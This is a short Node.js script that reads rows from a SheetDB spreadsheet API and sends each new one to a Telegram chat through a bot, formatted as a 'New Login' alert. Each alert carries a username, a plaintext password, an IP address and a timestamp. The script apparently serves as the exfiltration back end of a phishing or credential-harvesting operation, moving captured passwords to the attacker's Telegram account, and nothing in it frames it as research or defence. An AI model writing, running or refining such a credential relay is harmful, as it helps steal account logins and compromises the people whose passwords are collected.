import fs from "node:fs";

const SHEET_URL = "https://sheetdb.io/api/v1/irhjpmdb4vsdk";
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const MAX_PER_MESSAGE = 20;
const SEEN_FILE = "seen.json";

function loadSeen() {
  try {
    return new Set(JSON.parse(fs.readFileSync(SEEN_FILE, "utf8")));
  } catch {
    return new Set();
  }
}

function saveSeen(set) {
  fs.writeFileSync(SEEN_FILE, JSON.stringify([...set], null, 2));
}

function rowKey(row) {
  return JSON.stringify(Object.values(row).map((v) => String(v)));
}

function stripHTML(s) {
  return String(s ?? "").replace(/[&<>]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
}

async function fetchRows() {
  const res = await fetch(SHEET_URL);
  if (!res.ok) throw new Error(`SheetDB error: ${res.status}`);
  return res.json();
}

async function sendMessage(text) {
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    }),
  });
  const json = await res.json();
  if (!json.ok) throw new Error(`Telegram error: ${JSON.stringify(json)}`);
}

function fmt(row) {
  return `🆕 <b>New Login</b>\n👤 <b>${stripHTML(row.username)}</b>\n🔑 ${stripHTML(row.password)}\n🌐 ${stripHTML(row.ip)}\n🕒 ${stripHTML(row.timestamp)}`;
}

function chunkify(items) {
  const chunks = [];
  for (let i = 0; i < items.length; i += 10) {
    chunks.push(items.slice(i, i + 10).join("\n────────────\n"));
  }
  return chunks;
}

async function main() {
  const seen = loadSeen();
  const rows = await fetchRows();

  const fresh = rows.filter((r) => {
    const key = rowKey(r);
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });

  if (fresh.length === 0) {
    console.log("No new entries.");
    return;
  }

  saveSeen(seen);

  const latest = fresh.slice(-MAX_PER_MESSAGE);
  let chunks = chunkify(latest);
  if (fresh.length > MAX_PER_MESSAGE) {
    chunks[0] = `⚠️ ${fresh.length} total naye entries\n\n` + chunks[0];
  }

  for (const text of chunks) {
    console.log("MSG_SENT_START");
    console.log(text);
    console.log("MSG_SENT_END");
    await sendMessage(text);
  }

  console.log(`Sent ${fresh.length} notification(s).`);
}

main().catch((e) => {
  console.error("Error:", e.message);
  process.exit(1);
});
